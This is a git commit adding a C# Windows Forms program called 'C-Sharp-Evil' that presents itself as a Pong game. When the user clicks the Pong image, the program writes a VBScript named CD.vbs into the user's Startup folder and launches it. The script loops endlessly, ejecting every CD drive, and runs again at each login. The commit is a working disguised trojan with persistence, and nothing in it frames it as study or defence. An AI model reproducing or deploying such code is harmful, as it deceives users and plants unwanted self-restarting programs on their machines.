c40f74cccc4957efeac515ee8955be2e9278d803
BuildTools <kurtisbowen99@gmail.com>
2016-01-18 20:32:01 -0600

    Code

---
+++ C-Sharp-Evil/C-Sharp-Evil/Form1.Designer.cs
@@ -0,0 +1,70 @@
+﻿namespace C_Sharp_Evil
+{
+    partial class Evil
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Evil));
+            this.picPong = new System.Windows.Forms.PictureBox();
+            ((System.ComponentModel.ISupportInitialize)(this.picPong)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // picPong
+            // 
+            this.picPong.Dock = System.Windows.Forms.DockStyle.Fill;
+            this.picPong.Image = global::C_Sharp_Evil.Properties.Resources.pong;
+            this.picPong.Location = new System.Drawing.Point(0, 0);
+            this.picPong.Name = "picPong";
+            this.picPong.Size = new System.Drawing.Size(984, 461);
+            this.picPong.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
+            this.picPong.TabIndex = 0;
+            this.picPong.TabStop = false;
+            this.picPong.Click += new System.EventHandler(this.picPong_Click);
+            // 
+            // Evil
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(984, 461);
+            this.Controls.Add(this.picPong);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.MaximizeBox = false;
+            this.MinimizeBox = false;
+            this.Name = "Evil";
+            this.Text = "Pong";
+            ((System.ComponentModel.ISupportInitialize)(this.picPong)).EndInit();
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.PictureBox picPong;
+    }
+}
+
---
+++ C-Sharp-Evil/C-Sharp-Evil/Form1.cs
@@ -0,0 +1,77 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.IO;
+using System.Diagnostics;
+
+namespace C_Sharp_Evil
+{
+    public partial class Evil : Form
+    {
+        //C:\Users\Kurtis\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+        string CDVBSPath = @"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\";
+        string[] CDVBSArr = { //if a string array & .WriteAllLines are used, each string is its own line
+                                          "do",
+                                          "Dim ts",
+                                          "Dim strDriveLetter",
+                                          "Dim intDriveLetter",
+                                          "Dim fs 'As Scripting.FileSystemObject",
+                                          "Const CDROM = 4",
+                                          "On Error Resume Next",
+                                          "Set fs = CreateObject(\"Scripting.FileSystemObject\")",
+                                          "strDriveLetter = \"\"",
+                                          "For intDriveLetter = Asc(\"A\") To Asc(\"Z\")",
+                                          "Err.Clear",
+                                          "If fs.GetDrive(Chr(intDriveLetter)).DriveType = CDROM Then",
+                                          "If Err.Number = 0 Then",
+                                          "strDriveLetter = Chr(intDriveLetter)",
+                                          "Exit For",
+                                          "End If",
+                                          "End If",
+                                          "Next",
+                                          "Set oWMP = CreateObject(\"WMPlayer.OCX.7\" )",
+                                          "Set colCDROMs = oWMP.cdromCollection",
+                                          "For d = 0 to colCDROMs.Count - 1",
+                                          "colCDROMs.Item(d).Eject",
+                                          "Next 'null",
+                                          "",
+                                          "For d = 0 to colCDROMs.Count - 1",
+                                          "colCDROMs.Item(d).Eject",
+                                          "Next 'null",
+                                          "",
+                                          "set owmp = nothing",
+                                          "set colCDROMs = nothing",
+                                          "loop"
+                                      };
+
+        public Evil()
+        {
+            InitializeComponent();
+        }
+
+        private void picPong_Click(object sender, EventArgs e)
+        {
+            writeFile(CDVBSArr, CDVBSPath, @"CD.vbs");
+            Application.Exit();
+        }
+
+        private void writeFile(string[] toWrite, string Spath, string filename)
+        {
+            string path = Spath + filename;
+
+            if (File.Exists(path)) //if the temp file already exists, delete it
+            {
+                File.Delete(path);
+            }
+            using (FileStream fs = File.Create(path, 1024)) { } //create the file
+            System.IO.File.WriteAllLines(path, toWrite); //write to the file
+            Process.Start(path);
+        }
+    }
+}
